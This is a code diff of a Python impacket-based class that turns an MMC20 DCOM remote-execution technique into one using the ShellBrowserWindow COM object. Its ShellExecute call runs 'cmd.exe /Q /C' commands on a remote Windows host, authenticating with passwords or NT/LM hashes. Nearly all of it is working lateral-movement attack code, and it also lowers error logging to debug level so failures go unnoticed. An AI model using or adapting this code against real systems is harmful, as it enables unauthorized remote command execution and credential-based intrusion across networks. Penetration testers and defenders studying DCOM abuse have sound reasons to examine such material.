@@ -1,4 +1,5 @@
 import logging
+import sys
 from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
     VARIANT, VARENUM, DISPATCH_METHOD
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
@@ -8,7 +9,7 @@ from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM
 from impacket.dcerpc.v5.dtypes import NULL
 
 
-class MMCEXEC(object):
+class SHELLBRWWINEXEC(object):
     def __init__(self, target, username, password, domain, lmhash, nthash, connection=None):
         self.connection = connection
         self.target = target
@@ -19,39 +20,40 @@ class MMCEXEC(object):
         self.nthash = nthash
         self.aesKey = None
         self.doKerberos = False
-        self.shell = 'c:\\windows\\system32\\cmd.exe'
-        self.pwd = 'C:\\'
+        self.shell = 'cmd.exe'
+        self.pwd = 'C:\\windows\\system32'
         self.quit = None
         self.executeShellCommand = None
 
         dcom = DCOMConnection(self.target, self.username, self.password, self.domain, self.lmhash, self.nthash, None, oxidResolver=True, doKerberos=self.doKerberos)
         try:
-            iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
-            iMMC = IDispatch(iInterface)
-
-            resp = iMMC.GetIDsOfNames(('Document',))
 
             dispParams = DISPPARAMS(None, False)
             dispParams['rgvarg'] = NULL
             dispParams['rgdispidNamedArgs'] = NULL
+
             dispParams['cArgs'] = 0
             dispParams['cNamedArgs'] = 0
+
+            # ShellBrowserWindow CLSID (Windows 10, Windows Server 2012R2)
+            iInterface = dcom.CoCreateInstanceEx(string_to_bin('C08AFD90-F2A1-11D1-8455-00A0C91F3880'), IID_IDispatch)
+            iMMC = IDispatch(iInterface)
+            resp = iMMC.GetIDsOfNames(('Document',))
             resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
 
             iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
-            resp = iDocument.GetIDsOfNames(('ActiveView',))
+            resp = iDocument.GetIDsOfNames(('Application',))
             resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
             iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
-            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
-
-            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
 
             self.quit = (iMMC, pQuit)
             self.executeShellCommand = (iActiveView, pExecuteShellCommand)
 
         except Exception as e:
-            logging.error(str(e))
+            logging.debug(str(e))
             dcom.disconnect()
 
     def getInterface(self, interface, resp):
@@ -74,14 +76,14 @@ class MMCEXEC(object):
                       oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                       target=interface.get_target()))
 
-    def execute_command(self, data):
-        command = '/Q /C ' + data
+    def execute_command(self, command):
+        command = '/Q /C ' + command
 
         logging.debug("Command to execute: " + command)
 
         dispParams = DISPPARAMS(None, False)
         dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 4
+        dispParams['cArgs'] = 5
         dispParams['cNamedArgs'] = 0
         arg0 = VARIANT(None, False)
         arg0['clSize'] = 5
@@ -93,19 +95,26 @@ class MMCEXEC(object):
         arg1['clSize'] = 5
         arg1['vt'] = VARENUM.VT_BSTR
         arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg1['_varUnion']['bstrVal']['asData'] = self.pwd
+        arg1['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)
 
         arg2 = VARIANT(None, False)
         arg2['clSize'] = 5
         arg2['vt'] = VARENUM.VT_BSTR
         arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['bstrVal']['asData'] = command
+        arg2['_varUnion']['bstrVal']['asData'] = self.pwd
 
         arg3 = VARIANT(None, False)
         arg3['clSize'] = 5
         arg3['vt'] = VARENUM.VT_BSTR
         arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['bstrVal']['asData'] = '7'
+        arg3['_varUnion']['bstrVal']['asData'] = ''
+
+        arg4 = VARIANT(None, False)
+        arg4['clSize'] = 5
+        arg4['vt'] = VARENUM.VT_BSTR
+        arg4['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg4['_varUnion']['bstrVal']['asData'] = '0'
+        dispParams['rgvarg'].append(arg4)
         dispParams['rgvarg'].append(arg3)
         dispParams['rgvarg'].append(arg2)
         dispParams['rgvarg'].append(arg1)
